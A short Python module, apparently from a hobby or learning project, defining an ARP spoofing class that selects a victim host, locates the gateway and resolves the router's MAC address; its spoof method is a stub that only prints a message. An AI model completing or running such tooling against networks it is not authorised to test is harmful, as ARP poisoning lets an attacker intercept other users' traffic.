"""Arp Spoofing/Poisoning"""
from arp import Arp
from network_scanner import NetworkScanner


class ArpSpoof(Arp):
    """Arp Spoofing Related Methods
    """

    def __init__(self, scanner: NetworkScanner):
        self.scanner = scanner
        self.router_ip = self.scanner.get_gate()  # pylint: disable=fixme, no-member
        self.victim = self.scanner.menu()
        self.router_mac = self.get_router_mac()

    def get_router_mac(self):
        """Get the Mac address of the router

        Returns:
            str: router mac address
        """
        self.send_arp(self.scanner.mac_addr, self.scanner.ip_addr, self.router_ip)
        response = None
        while response is None:
            response = self.recv_arp()
        return response[1]

    def spoof(self):
        """Execute arp spoofing
        """
        print("[*] Poisoning...")
